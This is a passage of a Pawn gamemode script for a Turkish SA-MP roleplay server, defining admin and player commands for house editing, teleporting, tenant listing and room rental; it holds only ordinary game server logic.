	if(IsPlayerConnected(giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "Bu oyuncu zaten oyunda, bunun yerine /check kullan.");

	new
		szPlayerName[MAX_PLAYER_NAME],
	    szQuery[68];

	mysql_real_escape_string(params, szPlayerName, g_MySQLConnections[0]);
	format(szQuery, sizeof(szQuery), "SELECT * FROM players WHERE Username = '%s'", szPlayerName);
	mysql_query(szQuery, THREAD_GET_STATS, playerid, g_MySQLConnections[0]);
	return 1;
}

CMD:okills(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /okills [name]");

	new
		giveplayerid = ReturnUser(params);

	if(IsPlayerConnected(giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "Bu oyuncu oyunda, /kills komutunu kullanmalýsýn.");

	new
		szPlayerName[MAX_PLAYER_NAME],
	    szQuery[68];

	mysql_real_escape_string(params, szPlayerName, g_MySQLConnections[0]);
	format(szQuery, sizeof(szQuery), "SELECT * FROM players WHERE Username = '%s'", szPlayerName);
	mysql_query(szQuery, THREAD_OFFLINE_KILLS, playerid, g_MySQLConnections[0]);
	return 1;
}


CMD:evyardim(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** EV YARDIM *** - yardým alabilmek için komut yazýn.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** EV *** /ekilit /evikirala /kirayiayarla /kiracicikar /kiracilaricikar /evisat /evimisat /zilebas /kiracilar");
    SendClientMessage(playerid, COLOR_GRAD3,"*** EV *** /evdenal /evekoy /evkasasi /esilahal /esilahsakla /evedavetet /evanahtarlari /evanahtariver /evanahtarlarinial");
    return 1;
}

CMD:kirayardim(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** KÝRALAMA YARDIM *** - yardým alabilmek için komut yazýn.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** KÝRA *** /kiralamaiptal /gir /cik /kiracilar");
    return 1;
}

CMD:kiracilar(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "Evin yok.");

	new
		szMessage[128],
		count;

	SendClientMessage(playerid, COLOR_GREEN, "--------------------- [ Ev Kiracilari ] ---------------------");
	foreach(Player, i) {
		if(PlayerInfo[playerid][pHouse] == PlayerInfo[i][pRenting] && PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID) {
			format(szMessage, sizeof(szMessage), "Ev 1 | %s (%i)", GetPlayerNameEx(i), i);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			count++;
		} else if(PlayerInfo[playerid][pHouse2] == PlayerInfo[i][pRenting] && PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID) {
			format(szMessage, sizeof(szMessage), "House 2 | %s (%i)", GetPlayerNameEx(i), i);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			count++;
		}
	}
	if(count == 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Evini kimse kiralamýyor.");
    return 1;
}

CMD:hnext(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		SendClientMessage(playerid, COLOR_RED, "* Listing next available house...");
		for(new x;x<MAX_HOUSES;x++)
		{
		    if(HouseInfo[x][hOwned] == 0)
		    {
		        new string[128];
		        format(string, sizeof(string), "%d kullanýma müsait.", x);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        break;
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	return 1;
}

CMD:goinhouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new housenum;
		if(sscanf(params, "d", housenum)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /goinhouse [housenumber]");

		SetPlayerInterior(playerid,HouseInfo[housenum][hHInteriorWorld]);
		if(HouseInfo[housenum][hCustomInterior] == 1)
		{
			LoadObjectsForPlayer(playerid);
		}
		SetPlayerPos(playerid,HouseInfo[housenum][hInteriorX],HouseInfo[housenum][hInteriorY],HouseInfo[housenum][hInteriorZ]);
		GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
		PlayerInfo[playerid][pInt] = HouseInfo[housenum][hHInteriorWorld];
		PlayerInfo[playerid][pVW] = housenum+60000;
		SetPlayerVirtualWorld(playerid, housenum+60000);
	}
	return 1;
}

CMD:gotohouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new housenum;
		if(sscanf(params, "d", housenum)) return SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /gotohouse [housenumber]");

		SetPlayerPos(playerid,HouseInfo[housenum][hExteriorX],HouseInfo[housenum][hExteriorY],HouseInfo[housenum][hExteriorZ]);
		GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
	}
	return 1;
}

CMD:hedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
 	}

	new string[128], choice[32], houseid, amount;
	if(sscanf(params, "s[32]dD", choice, houseid, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /hedit [name] [houseid] [(Optional)amount]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Exterior, Interior, CustomInterior, CustomExterior, Level, Price");
		return 1;
	}

	if(strcmp(choice, "interior", true) == 0)
	{
		GetPlayerPos(playerid, HouseInfo[houseid][hInteriorX], HouseInfo[houseid][hInteriorY], HouseInfo[houseid][hInteriorZ]);
		GetPlayerFacingAngle(playerid, HouseInfo[houseid][hInteriorR]);
		HouseInfo[houseid][hHInteriorWorld] = GetPlayerInterior(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "Interioru deðiþtirdin.");
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Interior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "custominterior", true) == 0)
	{
		if(HouseInfo[houseid][hCustomInterior] == 0)
		{
			HouseInfo[houseid][hCustomInterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "House set to custom interior!");
		}
		else
		{
			HouseInfo[houseid][hCustomInterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "House set to normal (not custom) interior!");
		}
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Custom Interior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "customexterior", true) == 0)
	{
		if(HouseInfo[houseid][hCustomExterior] == 0)
		{
			HouseInfo[houseid][hCustomExterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "House set to custom exterior!");
		}
		else
		{
			HouseInfo[houseid][hCustomExterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "House set to normal (not custom) exterior!");
		}
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Custom Exterior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "exterior", true) == 0)
	{
		GetPlayerPos(playerid, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]);
		GetPlayerFacingAngle(playerid, HouseInfo[houseid][hExteriorR]);
		SendClientMessage(playerid, COLOR_WHITE, "Exterior'u deðiþtirdin.");
		DestroyPickup(HouseInfo[houseid][hPickupID]);
		SaveHouses();

		format(string, sizeof(string), "%s, %d ID2'li evin exteriorunu deðiþtirdi.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		if(HouseInfo[houseid][hOwned] ==0)
		{
			DestroyPickup(HouseInfo[houseid][hPickupID]);
			DestroyDynamic3DTextLabel(HouseInfo[houseid][hTextID]);
			format(string, sizeof(string), "Bu ev satýlýktýr!\n Level: %d\nID: %d\nÜcret: $%d\nSatýn almak için /evsatinal",HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hValue]);
			HouseInfo[houseid][hTextID] = CreateDynamic3DTextLabel(string, COLOR_HOUSEGREEN, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
			HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
		}
		else
		{
			if(HouseInfo[houseid][hRentable] == 0)
			{
				DestroyPickup(HouseInfo[houseid][hPickupID]);
				DestroyDynamic3DTextLabel(HouseInfo[houseid][hTextID]);
				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid);
				HouseInfo[houseid][hTextID] = CreateDynamic3DTextLabel(string,COLOR_HOUSEGREEN,HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
				HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
			}
			else
			{
				DestroyPickup(HouseInfo[houseid][hPickupID]);
				DestroyDynamic3DTextLabel(HouseInfo[houseid][hTextID]);
				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hRentFee]);
				HouseInfo[houseid][hTextID] = CreateDynamic3DTextLabel(string,COLOR_HOUSEGREEN,HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
				HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
			}
		}
	}
	else if(strcmp(choice, "level", true) == 0)
	{
		HouseInfo[houseid][hLevel] = amount;
		format(string, sizeof(string), "Evin levelini %d olarak deðiþtirdin.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(HouseInfo[houseid][hOwned] ==0)
		{
			format(string, sizeof(string), "Bu ev satýlýktýr!\n Level: %d\nID: %d\nÜcret: $%d\nSatýn almak için /evsatinal",HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hValue]);
			UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
		}
		else
		{
			if(HouseInfo[houseid][hRentable] == 0)
			{
				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid);
				UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
			}
			else
			{
				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hRentFee]);
				UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
			}
		}
		format(string, sizeof(string), "%s, %d ID'li evin levelini %d olarak deðiþtirdi.", GetPlayerNameEx(playerid), houseid, amount);
		Log("logs/hedit.log", string);
	}
	else if(strcmp(choice, "price", true) == 0)
	{
		HouseInfo[houseid][hValue] = amount;
		format(string, sizeof(string), "Evin fiyatýný $%d olarak deðiþtirdin.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(HouseInfo[houseid][hOwned] ==0)
		{
			format(string, sizeof(string), "Bu ev satýlýktýr!\nLevel: %d\nID: %d\nÜcret: $%d\nSatýn almak için /evsatinal",HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hValue]);
			UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
		}

		format(string, sizeof(string), "%s, %d ID'li evin fiyatýný $%d olarak deðiþtirdi.", GetPlayerNameEx(playerid), amount);
		Log("logs/hedit.log", string);
	}
	else if(strcmp(choice, "class", true) == 0)
	{
		switch(amount)
		{
		case 1:
			{
				format(HouseInfo[houseid][hDescription], 128, "Low");
				SendClientMessage(playerid, COLOR_WHITE, "Evin sýnýfýný 1 (Low) olarak deðiþtirdin");
			}
		case 2:
			{
				format(HouseInfo[houseid][hDescription], 128, "Medium");
				SendClientMessage(playerid, COLOR_WHITE, "Evin sýnýfýný 2 (Medium) olarak deðiþtirdin");
			}
		case 3:
			{
				format(HouseInfo[houseid][hDescription], 128, "High");
				SendClientMessage(playerid, COLOR_WHITE, "Evin sýnýfýný 3 (High) olarak deðiþtirdin");
			}
		}
		if(HouseInfo[houseid][hOwned] ==0)
		{
			format(string, sizeof(string), "Bu ev satýlýktýr!\n Bilgi: %s\nFiyat: $%d\n Level: %d\nID: %d\nBu evi almak için /evsatinal",HouseInfo[houseid][hDescription],HouseInfo[houseid][hValue],HouseInfo[houseid][hLevel],houseid);
			UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
		}

		format(string, sizeof(string), "%s, %d ID'li evin Class'ýný %d olarak deðiþtirdi.", GetPlayerNameEx(playerid), houseid, amount);
		Log("logs/hedit.log", string);
	}
	SaveHouses();
	return 1;
}
CMD:ehedit(playerid, params[])
{
	if(PlayerInfo[playerid][pEmlak] == 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}

	new string[128], choice[32], houseid, amount;
	if(sscanf(params, "s[32]dD", choice, houseid, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /hedit [name] [houseid] [(Optional)amount]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Exterior, Interior, CustomInterior, CustomExterior, Level, Price");
		return 1;
	}

	if(strcmp(choice, "interior", true) == 0)
	{
		GetPlayerPos(playerid, HouseInfo[houseid][hInteriorX], HouseInfo[houseid][hInteriorY], HouseInfo[houseid][hInteriorZ]);
		GetPlayerFacingAngle(playerid, HouseInfo[houseid][hInteriorR]);
		HouseInfo[houseid][hHInteriorWorld] = GetPlayerInterior(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "Interioru deðiþtirdin.");
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Interior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "custominterior", true) == 0)
	{
		if(HouseInfo[houseid][hCustomInterior] == 0)
		{
			HouseInfo[houseid][hCustomInterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "House set to custom interior!");
		}
		else
		{
			HouseInfo[houseid][hCustomInterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "House set to normal (not custom) interior!");
		}
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Custom Interior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "customexterior", true) == 0)
	{
		if(HouseInfo[houseid][hCustomExterior] == 0)
		{
			HouseInfo[houseid][hCustomExterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "House set to custom exterior!");
		}
		else
		{
			HouseInfo[houseid][hCustomExterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "House set to normal (not custom) exterior!");
		}
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Custom Exterior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "exterior", true) == 0)
	{
		GetPlayerPos(playerid, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]);
		GetPlayerFacingAngle(playerid, HouseInfo[houseid][hExteriorR]);
		SendClientMessage(playerid, COLOR_WHITE, "Exterior'u deðiþtirdin.");
		DestroyPickup(HouseInfo[houseid][hPickupID]);
		SaveHouses();

		format(string, sizeof(string), "%s, %d ID2'li evin exteriorunu deðiþtirdi.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		if(HouseInfo[houseid][hOwned] ==0)
		{
			DestroyPickup(HouseInfo[houseid][hPickupID]);
			DestroyDynamic3DTextLabel(HouseInfo[houseid][hTextID]);
			format(string, sizeof(string), "Bu ev satýlýktýr!\n Level: %d\nID: %d\nÜcret: $%d\nSatýn almak için /evsatinal",HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hValue]);
			HouseInfo[houseid][hTextID] = CreateDynamic3DTextLabel(string, COLOR_HOUSEGREEN, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
			HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
		}
		else
		{
			if(HouseInfo[houseid][hRentable] == 0)
			{
				DestroyPickup(HouseInfo[houseid][hPickupID]);
				DestroyDynamic3DTextLabel(HouseInfo[houseid][hTextID]);
				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid);
				HouseInfo[houseid][hTextID] = CreateDynamic3DTextLabel(string,COLOR_HOUSEGREEN,HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
				HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
			}
			else
			{
				DestroyPickup(HouseInfo[houseid][hPickupID]);
				DestroyDynamic3DTextLabel(HouseInfo[houseid][hTextID]);
				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hRentFee]);
				HouseInfo[houseid][hTextID] = CreateDynamic3DTextLabel(string,COLOR_HOUSEGREEN,HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
				HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
			}
		}
	}
	else if(strcmp(choice, "level", true) == 0)
	{
		HouseInfo[houseid][hLevel] = amount;
		format(string, sizeof(string), "Evin levelini %d olarak deðiþtirdin.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(HouseInfo[houseid][hOwned] ==0)
		{
			format(string, sizeof(string), "Bu ev satýlýktýr!\n Level: %d\nID: %d\nÜcret: $%d\nSatýn almak için /evsatinal",HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hValue]);
			UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
		}
		else
		{
			if(HouseInfo[houseid][hRentable] == 0)
			{
				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid);
				UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
			}
			else
			{
				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hRentFee]);
				UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
			}
		}
		format(string, sizeof(string), "%s, %d ID'li evin levelini %d olarak deðiþtirdi.", GetPlayerNameEx(playerid), houseid, amount);
		Log("logs/hedit.log", string);
	}
	else if(strcmp(choice, "price", true) == 0)
	{
		HouseInfo[houseid][hValue] = amount;
		format(string, sizeof(string), "Evin fiyatýný $%d olarak deðiþtirdin.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(HouseInfo[houseid][hOwned] ==0)
		{
			format(string, sizeof(string), "Bu ev satýlýktýr!\nLevel: %d\nID: %d\nÜcret: $%d\nSatýn almak için /evsatinal",HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hValue]);
			UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
		}

		format(string, sizeof(string), "%s, %d ID'li evin fiyatýný $%d olarak deðiþtirdi.", GetPlayerNameEx(playerid), amount);
		Log("logs/hedit.log", string);
	}
	else if(strcmp(choice, "class", true) == 0)
	{
		switch(amount)
		{
		case 1:
			{
				format(HouseInfo[houseid][hDescription], 128, "Low");
				SendClientMessage(playerid, COLOR_WHITE, "Evin sýnýfýný 1 (Low) olarak deðiþtirdin");
			}
		case 2:
			{
				format(HouseInfo[houseid][hDescription], 128, "Medium");
				SendClientMessage(playerid, COLOR_WHITE, "Evin sýnýfýný 2 (Medium) olarak deðiþtirdin");
			}
		case 3:
			{
				format(HouseInfo[houseid][hDescription], 128, "High");
				SendClientMessage(playerid, COLOR_WHITE, "Evin sýnýfýný 3 (High) olarak deðiþtirdin");
			}
		}
		if(HouseInfo[houseid][hOwned] ==0)
		{
			format(string, sizeof(string), "Bu ev satýlýktýr!\n Bilgi: %s\nFiyat: $%d\n Level: %d\nID: %d\nBu evi almak için /evsatinal",HouseInfo[houseid][hDescription],HouseInfo[houseid][hValue],HouseInfo[houseid][hLevel],houseid);
			UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
		}

		format(string, sizeof(string), "%s, %d ID'li evin Class'ýný %d olarak deðiþtirdi.", GetPlayerNameEx(playerid), houseid, amount);
		Log("logs/hedit.log", string);
	}
	SaveHouses();
	return 1;
}

CMD:hname(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
	}

	new string[128], houseid, ownername[24];
	if(sscanf(params, "ds[24]", houseid, ownername)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /hname [houseid] [name]");

	format(HouseInfo[houseid][hOwner], 24, "%s", ownername);
	format(string, sizeof(string), "Ev sahibini %s olarak deðiþtirdin.", ownername);
	HouseInfo[houseid][hOwned] = 1;
	HouseInfo[houseid][hRentable] = 0;
	SendClientMessage(playerid, COLOR_WHITE, string);
	DestroyPickup(HouseInfo[houseid][hPickupID]);
	HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
	format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid);
	UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);

	format(string, sizeof(string), "%s, %d ID'li evin sahibini %s olarak deðiþtirdi.", GetPlayerNameEx(playerid), houseid, ownername);
	Log("logs/hedit.log", string);

	return 1;
}

CMD:edit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8)
	{
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "|__________________ Edit __________________|");
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /edit [name] [amount]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Level, Price");
		SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
		return 1;
	}

	for(new i = 0; i < sizeof(HouseInfo); i++)
	{
		if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
		{
			format(string, sizeof(string), "Ev: %d", i);
			SendClientMessage(playerid, COLOR_GRAD2, string);
			if(amount > 0)
			{
				if(strcmp(choice,"level",true) == 0)
				{
					HouseInfo[i][hLevel] = amount;
				}
				else if(strcmp(choice,"price",true) == 0)
				{
					HouseInfo[i][hValue] = amount;
				}
			}
			if(HouseInfo[i][hOwned] ==0)
			{
				format(string, sizeof(string), "Bu ev satýlýktýr!\n Level: %d\nID: %d\nÜcret: $%d\nSatýn almak için /evsatinal",HouseInfo[i][hLevel],i,HouseInfo[i][hValue]);
				UpdateDynamic3DTextLabelText(HouseInfo[i][hTextID], COLOR_HOUSEGREEN, string);
			}
			else
			{
				if(HouseInfo[i][hRentable] == 0)
				{
     				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[i][hOwner],HouseInfo[i][hLevel],i);
					UpdateDynamic3DTextLabelText(HouseInfo[i][hTextID], COLOR_HOUSEGREEN, string);
				}
				else
				{
     				format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala",HouseInfo[i][hOwner],HouseInfo[i][hLevel],i,HouseInfo[i][hRentFee]);
					UpdateDynamic3DTextLabelText(HouseInfo[i][hTextID], COLOR_HOUSEGREEN, string);
				}
			}
		}
	}
	return 1;
}

CMD:odakirala(playerid, params[])
{
    //new string[128];
    new Float:oldposx, Float:oldposy, Float:oldposz;
    new playername[MAX_PLAYER_NAME];
    GetPlayerName(playerid, playername, sizeof(playername));
    GetPlayerPos(playerid, oldposx, oldposy, oldposz);
    for(new h = 0; h < sizeof(HouseInfo); h++)
	{
        if(IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ]) && HouseInfo[h][hRentFee] >= 1)
		{
            if(! strcmp(HouseInfo[h][hOwner], "Nobody", true))
			{
                SendClientMessage(playerid, COLOR_WHITE, "Sahibi olmayan evi kiralayamazsýn.");
            }
            else
			{
                if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
				{
                    SendClientMessage(playerid, COLOR_WHITE, "   Zaten bir evin var, eðer bunu kiralamak istiyorsan /evisat yaz.");
                    return 1;
                }
                if(GetPlayerCash(playerid) > HouseInfo[h][hRentFee])
				{
                    if(HouseInfo[h][hRentable] == 0)
					{
                        SendClientMessage(playerid, COLOR_WHITE, "Bu ev kiralanabilir deðil.");
                        return 1;
                    }
                    else
					{
                        PlayerInfo[playerid][pRenting] = h;
                        GivePlayerCash(playerid,-HouseInfo[h][hRentFee]);
                        HouseInfo[h][hSafeMoney] = HouseInfo[h][hSafeMoney]+HouseInfo[h][hRentFee];
                        SetPlayerInterior(playerid,HouseInfo[h][hHInteriorWorld]);
                        if(HouseInfo[h][hCustomInterior] == 1)
						{
                            LoadObjectsForPlayer(playerid);
                        }
                        SetPlayerPos(playerid,HouseInfo[h][hInteriorX],HouseInfo[h][hInteriorY],HouseInfo[h][hInteriorZ]);
